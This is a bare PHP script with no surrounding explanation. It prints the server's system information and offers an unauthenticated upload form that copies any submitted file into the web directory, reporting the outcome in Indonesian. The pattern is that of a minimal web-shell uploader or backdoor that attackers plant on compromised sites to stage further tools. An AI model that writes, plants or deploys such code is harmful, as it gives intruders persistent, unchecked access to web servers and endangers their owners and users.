<?php
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='BS7'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	if(@copy($_FILES['BS7']['tmp_name'], $_FILES['BS7']['name'])) {
	echo "sukses";
	} else {
	echo "gagal";
	}
}
?>
